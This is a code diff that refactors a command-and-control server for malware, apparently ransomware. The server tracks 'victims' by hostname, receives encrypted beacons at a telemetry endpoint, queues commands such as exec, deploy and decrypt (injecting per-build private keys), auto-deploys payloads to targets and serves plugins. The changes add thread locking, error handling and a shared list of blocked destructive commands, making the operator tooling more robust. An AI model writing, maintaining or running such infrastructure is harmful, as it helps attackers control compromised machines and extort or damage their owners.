@@ -1,6 +1,7 @@
 import os
 import json
 import re
+import sqlite3
 import threading
 import hashlib
 import base64
@@ -30,11 +31,14 @@ app.config['TEMPLATE_AUTO_RELOAD'] = True
 socketio = SocketIO(app, cors_allowed_origins='*', async_mode='gevent')
 
 pending_commands = {}
+commands_lock = threading.Lock()
 auto_deploy_targets = set()
 AUTO_DEPLOY_PATH = os.path.join(DATA_DIR, "auto_deploy.json")
 PAYLOAD_DIR = os.path.join(os.path.dirname(os.path.dirname(__file__)), "dist")
 PLUGIN_DIR = os.path.join(os.path.dirname(__file__), "plugins")
 API_KEY = os.environ.get('C2_API_KEY')
+
+DANGEROUS_PATTERNS = ['rm -rf', 'format', 'del /f', 'rd /s', 'shutdown']
 
 
 def require_auth():
@@ -46,7 +50,6 @@ def require_auth():
 
 
 def init_db():
-    import sqlite3
     conn = sqlite3.connect(DB_PATH)
     conn.execute("""
         CREATE TABLE IF NOT EXISTS victims (
@@ -220,7 +223,6 @@ def decrypt_data(data: bytes) -> dict:
 
 
 def store_victim(hostname: str, data: dict, last_seen: str):
-    import sqlite3
     encrypted = encrypt_data(data)
     conn = sqlite3.connect(DB_PATH)
     conn.execute(
@@ -233,7 +235,6 @@ def store_victim(hostname: str, data: dict, last_seen: str):
 
 
 def get_all_victims() -> dict:
-    import sqlite3
     conn = sqlite3.connect(DB_PATH)
     rows = conn.execute(
         "SELECT hostname, data_encrypted, last_seen FROM victims"
@@ -254,7 +255,6 @@ def get_all_victims() -> dict:
 
 
 def get_victim(hostname: str) -> dict:
-    import sqlite3
     conn = sqlite3.connect(DB_PATH)
     row = conn.execute(
         "SELECT hostname, data_encrypted, last_seen FROM victims "
@@ -277,7 +277,6 @@ def get_victim(hostname: str) -> dict:
 
 
 def log_command(hostname: str, command: str, params: dict, result: str):
-    import sqlite3
     params_encrypted = encrypt_data(params) if params else None
     conn = sqlite3.connect(DB_PATH)
     conn.execute(
@@ -292,7 +291,6 @@ def log_command(hostname: str, command: str, params: dict, result: str):
 
 
 def delete_victim(hostname: str):
-    import sqlite3
     conn = sqlite3.connect(DB_PATH)
     conn.execute("DELETE FROM victims WHERE hostname = ?", (hostname,))
     conn.commit()
@@ -301,7 +299,6 @@ def delete_victim(hostname: str):
 
 
 def get_private_key(build_number: int) -> str | None:
-    import sqlite3
     conn = sqlite3.connect(DB_PATH)
     row = conn.execute(
         "SELECT private_key FROM build_keys WHERE build_number = ?",
@@ -312,7 +309,6 @@ def get_private_key(build_number: int) -> str | None:
 
 
 def get_command_log(hostname: str = None, limit: int = 20) -> list:
-    import sqlite3
     conn = sqlite3.connect(DB_PATH)
     if hostname:
         rows = conn.execute(
@@ -334,7 +330,6 @@ def get_command_log(hostname: str = None, limit: int = 20) -> list:
 
 
 def _load_alert_rules() -> list:
-    import sqlite3
     conn = sqlite3.connect(DB_PATH)
     rows = conn.execute(
         "SELECT id, name, field, operator, value, action_type, action_params "
@@ -383,7 +378,6 @@ def _eval_rule(rule: dict, beacon_data: dict, result_text: str) -> bool:
 
 def _log_alert(rule_id: int, rule_name: str, hostname: str,
                field: str, value: str, action: str):
-    import sqlite3
     conn = sqlite3.connect(DB_PATH)
     conn.execute(
         "INSERT INTO alert_log (rule_id, rule_name, hostname, "
@@ -397,7 +391,6 @@ def _log_alert(rule_id: int, rule_name: str, hostname: str,
 
 
 def _get_alert_log(hostname: str = None, limit: int = 50) -> list:
-    import sqlite3
     conn = sqlite3.connect(DB_PATH)
     if hostname:
         rows = conn.execute(
@@ -423,7 +416,6 @@ def _get_alert_log(hostname: str = None, limit: int = 50) -> list:
 
 def evaluate_alert_rules(hostname: str, beacon_data: dict, result_text: str):
     rules = _load_alert_rules()
-    dangerous_patterns = ['rm -rf', 'format', 'del /f', 'rd /s', 'shutdown']
     for rule in rules:
         if not _eval_rule(rule, beacon_data, result_text):
             continue
@@ -431,18 +423,19 @@ def evaluate_alert_rules(hostname: str, beacon_data: dict, result_text: str):
         field = rule['field']
         actual = result_text if field == 'command_result' else str(beacon_data.get(field, ''))
         atype = rule['action_type']
+        atype_label = {'notify_dashboard': 'notified dashboard', 'log': 'logged', 'auto_command': 'auto command'}.get(atype, atype)
         logger.info("Alert matched: %s on %s (%s %s %s)", rname, hostname, field, rule['operator'], rule['value'])
+        alert_entry = {
+            'rule': rname, 'hostname': hostname, 'field': field,
+            'value': actual, 'action': atype_label,
+            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
+        }
         if atype == 'notify_dashboard':
-            socketio.emit('rule_alert', {
-                'rule': rname, 'hostname': hostname,
-                'field': field, 'value': actual,
-            })
+            socketio.emit('rule_alert', alert_entry)
             _log_alert(rule['id'], rname, hostname, field, actual, 'notified dashboard')
         elif atype == 'log':
             _log_alert(rule['id'], rname, hostname, field, actual, 'logged')
-            recent = _get_alert_log(hostname, limit=1)
-            if recent:
-                socketio.emit('alert_log_update', {'entry': recent[0]})
+            socketio.emit('rule_alert', alert_entry)
         elif atype == 'auto_command':
             try:
                 action_params = json.loads(rule['action_params']) if rule['action_params'] else {}
@@ -450,12 +443,13 @@ def evaluate_alert_rules(hostname: str, beacon_data: dict, result_text: str):
                 cmd_params = action_params.get('params', {})
                 if cmd_name == 'exec':
                     cmd_value = cmd_params.get('cmd', '')
-                    if any(d in cmd_value.lower() for d in dangerous_patterns):
+                    if any(d in cmd_value.lower() for d in DANGEROUS_PATTERNS):
                         logger.warning("Alert auto_command blocked for %s: dangerous pattern", hostname)
                         _log_alert(rule['id'], rname, hostname, field, actual,
                                    f'auto_command blocked: dangerous pattern')
                         continue
-                pending_commands[hostname] = {'command': cmd_name, 'params': cmd_params}
+                with commands_lock:
+                    pending_commands[hostname] = {'command': cmd_name, 'params': cmd_params}
                 _log_alert(rule['id'], rname, hostname, field, actual,
                            f'auto_command queued: {cmd_name}')
                 logger.info("Alert auto_command queued %s for %s (rule: %s)", cmd_name, hostname, rname)
@@ -496,7 +490,6 @@ def _list_plugins() -> list:
 
 
 def _log_plugin_download(hostname: str, plugin_name: str):
-    import sqlite3
     now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
     conn = sqlite3.connect(DB_PATH)
     conn.execute(
@@ -509,7 +502,6 @@ def _log_plugin_download(hostname: str, plugin_name: str):
 
 
 def _get_plugin_downloads() -> dict:
-    import sqlite3
     conn = sqlite3.connect(DB_PATH)
     rows = conn.execute(
         "SELECT plugin_name, hostname FROM plugin_downloads "
@@ -533,68 +525,76 @@ def telemetry():
     try:
         encrypted_data = request.form.get('data', '')
         if not encrypted_data:
-            encrypted_data = request.json.get('data', '') if request.json else ''
+            body = request.json if request.json else {}
+            encrypted_data = body.get('data', '') if isinstance(body, dict) else ''
         decrypted = traffic_crypto.decrypt(encrypted_data.encode())
         data = json.loads(decrypted)
     except Exception as e:
         logger.warning("Telemetry decrypt failed: %s", e)
         return jsonify({'success': False, 'message': 'invalid data'}), 400
 
-    hostname = data.get('hostname')
-    if hostname:
-        last_seen = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+    try:
+        hostname = data.get('hostname')
+        if hostname:
+            last_seen = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
 
-        if crypto is not None:
-            existing = get_victim(hostname)
-            result_text = data.get('result')
-            last_result = existing.get('last_result') if existing else None
-            if result_text:
-                last_result = {'result': result_text}
-            stored = {
-                'beacon_data': data,
-                'last_result': last_result,
+            if crypto is not None:
+                existing = get_victim(hostname)
+                result_text = data.get('result')
+                last_result = existing.get('last_result') if existing else None
+                if result_text:
+                    last_result = {'result': result_text}
+                stored = {
+                    'beacon_data': data,
+                    'last_result': last_result,
+                }
+                store_victim(hostname, stored, last_seen)
+                vdata = get_victim(hostname)
+                socketio.emit('victim_update', {'hostname': hostname, 'info': vdata})
+                logger.info("Telemetry from %s: status=%s", hostname, data.get('status'))
+                evaluate_alert_rules(hostname, data, result_text)
+
+                if result_text:
+                    log_command(hostname, 'result', {}, result_text)
+                    logger.info("Result from %s: %s", hostname, result_text)
+                    if result_text == 'self_destructed':
+                        delete_victim(hostname)
+                        socketio.emit('victim_removed', {'hostname': hostname})
+                    entry = get_command_log(hostname, limit=1)
+                    if entry:
+                        socketio.emit('command_log_update', {'entry': entry[0]})
+            else:
+                logger.info("Telemetry from %s (locked — not stored)", hostname)
+
+        if hostname and hostname in auto_deploy_targets:
+            agent = (data.get('agent') or '').lower()
+            vtype = (data.get('type') or '').lower()
+            deployed = data.get('deployed', False)
+            if agent in ('', 'hw_detect') and vtype in ('', 'scanner') and not deployed:
+                with commands_lock:
+                    pending_commands[hostname] = {'command': 'deploy', 'params': {}}
+                logger.info("Auto-deploy queued for %s", hostname)
+
+        cmd = None
+        if hostname and hostname in pending_commands:
+            with commands_lock:
+                if hostname in pending_commands:
+                    cmd = pending_commands[hostname]
+                    del pending_commands[hostname]
+            log_command(hostname, cmd['command'], cmd.get('params', {}), 'delivered')
+            logger.info("  -> Sending command: %s", cmd['command'])
+
+        response = {'success': True, 'message': 'ok', 'poll_ms': 60000}
+        if cmd:
+            response['config'] = {
+                'flags': traffic_crypto.encrypt(
+                    json.dumps(cmd).encode()
+                ).decode()
             }
-            store_victim(hostname, stored, last_seen)
-            vdata = get_victim(hostname)
-            socketio.emit('victim_update', {'hostname': hostname, 'info': vdata})
-            logger.info("Telemetry from %s: status=%s", hostname, data.get('status'))
-            evaluate_alert_rules(hostname, data, result_text)
-
-            if result_text:
-                log_command(hostname, 'result', {}, result_text)
-                logger.info("Result from %s: %s", hostname, result_text)
-                if result_text == 'self_destructed':
-                    delete_victim(hostname)
-                    socketio.emit('victim_removed', {'hostname': hostname})
-                entry = get_command_log(hostname, limit=1)
-                if entry:
-                    socketio.emit('command_log_update', {'entry': entry[0]})
-        else:
-            logger.info("Telemetry from %s (locked — not stored)", hostname)
-
-    if hostname and hostname in auto_deploy_targets:
-        agent = (data.get('agent') or '').lower()
-        vtype = (data.get('type') or '').lower()
-        deployed = data.get('deployed', False)
-        if agent in ('', 'hw_detect') and vtype in ('', 'scanner') and not deployed:
-            pending_commands[hostname] = {'command': 'deploy', 'params': {}}
-            logger.info("Auto-deploy queued for %s", hostname)
-
-    cmd = None
-    if hostname and hostname in pending_commands:
-        cmd = pending_commands[hostname]
-        del pending_commands[hostname]
-        log_command(hostname, cmd['command'], cmd.get('params', {}), 'delivered')
-        logger.info("  -> Sending command: %s", cmd['command'])
-
-    response = {'success': True, 'message': 'ok', 'poll_ms': 60000}
-    if cmd:
-        response['config'] = {
-            'flags': traffic_crypto.encrypt(
-                json.dumps(cmd).encode()
-            ).decode()
-        }
-    return jsonify(response)
+        return jsonify(response)
+    except Exception as e:
+        logger.error("Telemetry handler error: %s", e, exc_info=True)
+        return jsonify({'success': False, 'message': 'internal error'}), 500
 
 
 @app.route('/victims', methods=['GET'])
@@ -632,18 +632,18 @@ def send_command():
     command = data.get('command', '')
     if command == 'exec':
         cmd_value = data.get('params', {}).get('cmd', '')
-        dangerous = ['rm -rf', 'format', 'del /f', 'rd /s', 'shutdown']
-        if any(d in cmd_value.lower() for d in dangerous):
+        if any(d in cmd_value.lower() for d in DANGEROUS_PATTERNS):
             return jsonify({'error': 'command blocked'}), 403
 
     params = data.get('params', {})
     if command == 'decrypt':
         params = _inject_private_key(hostname, params)
 
-    pending_commands[hostname] = {
-        'command': command,
-        'params': params,
-    }
+    with commands_lock:
+        pending_commands[hostname] = {
+            'command': command,
+            'params': params,
+        }
     logger.info("Queued %s for %s", command, hostname)
     return jsonify({'status': 'ok'})
 
@@ -708,15 +708,15 @@ def handle_send_command(data):
 
     if command == 'exec':
         cmd_value = params.get('cmd', '')
-        dangerous = ['rm -rf', 'format', 'del /f', 'rd /s', 'shutdown']
-        if any(d in cmd_value.lower() for d in dangerous):
+        if any(d in cmd_value.lower() for d in DANGEROUS_PATTERNS):
             emit('command_sent', {'error': 'command blocked'})
             return
 
     if command == 'decrypt':
         params = _inject_private_key(hostname, params)
 
-    pending_commands[hostname] = {'command': command, 'params': params}
+    with commands_lock:
+        pending_commands[hostname] = {'command': command, 'params': params}
     logger.info("Socket queued %s for %s", command, hostname)
     emit('command_sent', {'status': 'ok', 'hostname': hostname, 'command': command})
 
@@ -934,7 +934,6 @@ def handle_shutdown(data):
 def list_alert_rules():
     if crypto is None:
         return jsonify({'error': 'server locked'}), 401
-    import sqlite3
     conn = sqlite3.connect(DB_PATH)
     rows = conn.execute(
         "SELECT id, name, field, operator, value, action_type, "
@@ -958,7 +957,6 @@ def create_alert_rule():
     for k in required:
         if k not in data:
             return jsonify({'error': f'missing {k}'}), 400
-    import sqlite3
     conn = sqlite3.connect(DB_PATH)
     conn.execute(
         "INSERT INTO alert_rules (name, field, operator, value, "
@@ -979,7 +977,6 @@ def update_alert_rule(rule_id):
     if crypto is None:
         return jsonify({'error': 'server locked'}), 401
     data = request.json or {}
-    import sqlite3
     conn = sqlite3.connect(DB_PATH)
     existing = conn.execute(
         "SELECT id FROM alert_rules WHERE id = ?", (rule_id,)
@@ -1014,7 +1011,6 @@ def update_alert_rule(rule_id):
 def delete_alert_rule(rule_id):
     if crypto is None:
         return jsonify({'error': 'server locked'}), 401
-    import sqlite3
     conn = sqlite3.connect(DB_PATH)
     conn.execute("DELETE FROM alert_rules WHERE id = ?", (rule_id,))
     conn.commit()
@@ -1026,7 +1022,6 @@ def delete_alert_rule(rule_id):
 def toggle_alert_rule(rule_id):
     if crypto is None:
         return jsonify({'error': 'server locked'}), 401
-    import sqlite3
     conn = sqlite3.connect(DB_PATH)
     row = conn.execute(
         "SELECT enabled FROM alert_rules WHERE id = ?", (rule_id,)
